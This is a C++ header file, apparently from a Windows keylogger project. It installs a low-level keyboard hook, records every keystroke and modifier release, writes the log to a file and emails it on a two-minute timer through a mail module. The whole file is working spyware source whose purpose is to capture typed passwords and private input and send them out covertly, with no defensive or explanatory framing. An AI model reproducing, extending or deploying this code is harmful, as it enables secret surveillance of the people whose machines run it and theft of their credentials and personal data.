#ifndef KEYBHOOK_H
#define KEYBHOOK_H
#include<iostream>
#include<fstream>
#include "KeyConstants.h"
#include "windows.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
    if(keylog.empty())
    return;
    std::string last_file = IO::WriteLog(keylog);
    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
        return;
    }
    int x= Mail::SendMail("Log [" + last_file + "]", "Hi! \nThe file has been attached to this mail.\n" + keylog, IO::GetPath(true) + last_file);
    if(x!=7) //mail sending failed
    {
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    }
    else
    {
        keylog = "";
    }
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

HHOOK eHook = NULL;
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
    CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
        {
            keylog += '\n';
        }
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        //DWORD key = kbs->vkCode;
        if( kbs->vkCode == VK_CONTROL || kbs->vkCode == VK_LCONTROL || kbs->vkCode == VK_RCONTROL || kbs->vkCode == VK_SHIFT || kbs->vkCode == VK_LSHIFT || kbs->vkCode == VK_RSHIFT || kbs->vkCode == VK_MENU || kbs->vkCode == VK_LMENU || kbs->vkCode == VK_RMENU || kbs->vkCode == VK_CAPITAL || kbs->vkCode == VK_NUMLOCK || kbs->vkCode == VK_LWIN || kbs->vkCode == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1,"/");
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started ... Timer started");
    MailTimer.Start(true);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx (eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif
